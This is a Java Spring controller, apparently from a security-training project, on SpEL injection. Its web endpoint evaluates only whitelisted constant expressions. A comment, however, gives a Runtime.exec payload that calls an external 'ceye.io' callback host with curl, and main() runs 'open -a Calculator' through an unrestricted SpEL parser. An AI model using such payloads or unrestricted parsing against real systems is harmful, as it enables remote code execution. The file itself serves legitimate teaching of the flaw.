package org.joychou.controller;

import org.springframework.expression.EvaluationContext;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.SimpleEvaluationContext;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.HtmlUtils;

import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.Map;


/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    private static final Map<String, String> EXPRESSIONS;

    static {
        Map<String, String> m = new LinkedHashMap<String, String>();
        m.put("hello", "'Hello World'");
        m.put("sum", "1 + 2");
        m.put("product", "6 * 7");
        EXPRESSIONS = Collections.unmodifiableMap(m);
    }

    /**
     * SpEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        // The request value is only a key into a server-side catalogue; the text handed to the
        // SpEL parser is always one of the constant expressions below, never request data.
        String constantExpression = lookupExpression(expression);
        if (constantExpression == null) {
            return "Bad boy. I got u.";
        }
        ExpressionParser parser = new SpelExpressionParser();
        // SimpleEvaluationContext: no type references, constructors or arbitrary method calls
        EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build();
        return HtmlUtils.htmlEscape(String.valueOf(parser.parseExpression(constantExpression).getValue(context)));
    }

    private static String lookupExpression(String key) {
        if (key == null) {
            return null;
        }
        for (Map.Entry<String, String> entry : EXPRESSIONS.entrySet()) {
            if (entry.getKey().equals(key.trim())) {
                return entry.getValue();
            }
        }
        return null;
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}

